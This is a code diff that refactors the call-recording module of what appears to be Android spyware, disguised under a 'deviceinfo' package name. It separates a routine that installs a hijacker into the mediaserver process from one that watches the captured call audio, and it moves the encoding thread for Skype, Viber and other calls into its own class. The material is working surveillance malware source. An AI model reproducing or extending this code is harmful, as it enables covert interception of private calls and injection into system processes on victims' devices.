@@ -27,7 +27,6 @@ import android.os.FileObserver;
 
 import com.android.deviceinfo.Call;
 import com.android.deviceinfo.Device;
-import com.android.deviceinfo.ProcessInfo;
 import com.android.deviceinfo.RunningProcesses;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
@@ -43,6 +42,8 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerCall;
 import com.android.deviceinfo.listener.ListenerProcess;
+import com.android.deviceinfo.module.call.Chunk;
+import com.android.deviceinfo.module.call.EncodingTask;
 import com.android.deviceinfo.module.chat.CallInfo;
 import com.android.deviceinfo.module.chat.ChatSkype;
 import com.android.deviceinfo.module.chat.ChatViber;
@@ -164,76 +165,86 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + "(actualStart): starting audio storage management");
 			}
 
-			// Initialize the callback system
-			cb = new CallBack();
-			cb.register(new InternalCallBack());
-
-			hijack = new Instrument("mediaserver", AudioEncoder.getAudioStorage());
-
-			if (hijack.installHijacker()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(actualStart): hijacker successfully installed");
-				}
-
-				hijack.startInstrumentation();
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(actualStart): hijacker cannot be installed");
-				}
-
-				return;
+			if(installHijack()){
+				startWatchAudio();
 			}
-
-			calls = new LinkedBlockingQueue<String>();
-
-			// Remove stray .bin files
-			purgeAudio();
-
-			// Scan for previously stored audio files
-			scrubAudio();
-
-			// Start the monitor and encoding thread
-			encodingTask = new EncodingTask(sync, calls);
-
-			queueMonitor = new Thread(encodingTask);
-			queueMonitor.start();
-
-			// Give it time to spawn before signaling
-			Utils.sleep(500);
-
-			while (queueMonitor.isAlive() == false) {
-				Utils.sleep(250);
-			}
-
-			// Tell the thread to process scrubbed files
-			encodingTask.wake();
-
-			// Observe our audio storage (events are filtered so if you push a
-			// .tmp using ADB it wont
-			// trigger, you have to copy the test file and RENAME it .tmp to
-			// trigger this observer)
-			observer = new FileObserver(AudioEncoder.getAudioStorage(), FileObserver.MOVED_TO) {
-				@Override
-				public void onEvent(int event, String file) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "(onEvent): event: " + event + " for file: " + file);
-					}
-
-					// Add to list
-					if (addToEncodingList(AudioEncoder.getAudioStorage() + file) == true) {
-						synchronized (sync) {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + "(onEvent): signaling EncodingTask thread");
-							}
-
-							encodingTask.wake();
-						}
-					}
-				}
-			};
-
-			observer.startWatching();
 		}
+	}
+
+	private void startWatchAudio() {
+		calls = new LinkedBlockingQueue<String>();
+
+		// Remove stray .bin files
+		purgeAudio();
+
+		// Scan for previously stored audio files
+		scrubAudio();
+
+		// Start the monitor and encoding thread
+		encodingTask = new EncodingTask(this, sync, calls);
+
+		queueMonitor = new Thread(encodingTask);
+		queueMonitor.start();
+
+		// Give it time to spawn before signaling
+		Utils.sleep(500);
+
+		while (queueMonitor.isAlive() == false) {
+			Utils.sleep(250);
+		}
+
+		// Tell the thread to process scrubbed files
+		encodingTask.wake();
+
+		// Observe our audio storage (events are filtered so if you push a
+		// .tmp using ADB it wont
+		// trigger, you have to copy the test file and RENAME it .tmp to
+		// trigger this observer)
+		observer = new FileObserver(AudioEncoder.getAudioStorage(), FileObserver.MOVED_TO) {
+			@Override
+			public void onEvent(int event, String file) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(onEvent): event: " + event + " for file: " + file);
+				}
+
+				// Add to list
+				if (addToEncodingList(AudioEncoder.getAudioStorage() + file) == true) {
+					synchronized (sync) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "(onEvent): signaling EncodingTask thread");
+						}
+
+						encodingTask.wake();
+					}
+				}
+			}
+		};
+
+		observer.startWatching();
+	}
+
+	private boolean installHijack() {
+		// Initialize the callback system
+		cb = new CallBack();
+		cb.register(new InternalCallBack());
+
+		hijack = new Instrument("mediaserver", AudioEncoder.getAudioStorage());
+
+		if (hijack.installHijacker()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(actualStart): hijacker successfully installed");
+			}
+
+			hijack.startInstrumentation();
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(actualStart): hijacker cannot be installed");
+			}
+
+			return false;
+		}
+		
+		return true;
 	}
 
 	private void purgeAudio() {
@@ -294,83 +305,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			String fullName = storedFile.getAbsolutePath();
 
 			addToEncodingList(fullName);
-		}
-	}
-
-	class EncodingTask implements Runnable, Observer<ProcessInfo> {
-		Object sync;
-		BlockingQueue<String> queue;
-		boolean stopQueueMonitor;
-
-		EncodingTask(Object t, BlockingQueue<String> l) {
-			sync = t;
-			queue = l;
-			ListenerProcess.self().attach(this);
-		}
-
-		public void stop() {
-			stopQueueMonitor = true;
-			ListenerProcess.self().detach(this);
-			wake();
-
-		}
-
-		public void wake() {
-			synchronized (sync) {
-				sync.notify();
-			}
-		}
-
-		public void run() {
-			while (true) {
-				synchronized (sync) {
-					try {
-						sync.wait();
-					} catch (InterruptedException e) {
-						if (Cfg.EXCEPTION) {
-							Check.log(e);
-						}
-					}
-				}
-
-				if (stopQueueMonitor) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "(EncodingTask run): killing audio encoding thread");
-
-					}
-					return;
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(EncodingTask run): thread awoken, time to encode");
-				}
-
-				// Browse lists and check if an encoding is already in
-				// progress
-				try {
-					while (queue.isEmpty() == false) {
-						String file = queue.take();
-
-						// Check if end of conversation
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(EncodingTask run): decoding " + file);
-						}
-
-						encodeChunks(file);
-
-					}
-				} catch (Exception e) {
-					if (Cfg.EXCEPTION) {
-						Check.log(e);
-					}
-				}
-
-			}
-		}
-
-		@Override
-		public int notification(ProcessInfo b) {
-			return 0;
 		}
 	}
 
@@ -977,7 +911,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	// start: call start date
 	// sec_length: call length in seconds
 	// type: call type (Skype, Viber, Paltalk, Hangout)
-	private void encodeChunks(String f) {
+	public void encodeChunks(String f) {
 		int first_epoch, last_epoch;
 		AudioEncoder audioEncoder = new AudioEncoder(f);
 
